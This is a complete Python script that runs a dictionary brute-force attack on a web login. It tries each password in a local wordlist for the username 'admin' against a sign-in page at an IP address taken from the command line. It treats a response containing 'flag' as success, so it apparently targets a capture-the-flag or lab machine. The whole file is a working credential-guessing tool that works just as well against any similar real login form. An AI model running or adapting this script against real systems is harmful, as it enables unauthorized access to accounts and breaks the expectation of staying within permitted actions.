import sys
import requests
import urllib.parse

def read_file(path: str):
    with open(path, 'r') as file:
        lines = []

        for line in file:
            lines.append(line.strip())

    return lines

def try_authentication(username: str, password: str):
    print(f"[username: {username}] [password: {password}] => ", end="", flush=True)
    params = {
        'page': 'signin',
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    encoded_params = urllib.parse.urlencode(params)

    url = f'http://{sys.argv[1]}/?{{}}'.format(encoded_params)

    response = requests.get(url)
    success = response.text.find('flag') != -1
    print(success)

    return success, response.text

def main():
    try:
        assert len(sys.argv) == 2, "IP address is not valid."

        print("=== Brute forcing website ===")
        username = "admin"
        file = "dictionary.txt"
        passwords = read_file(file)

        for password in passwords:
            success, response = try_authentication(username, password)

            if success:
                print(response)
                return

        print(f"Password for username {username} is not in list.")
    except Exception as err:
        print(f'Error: {err}')

if __name__ == "__main__":
    main()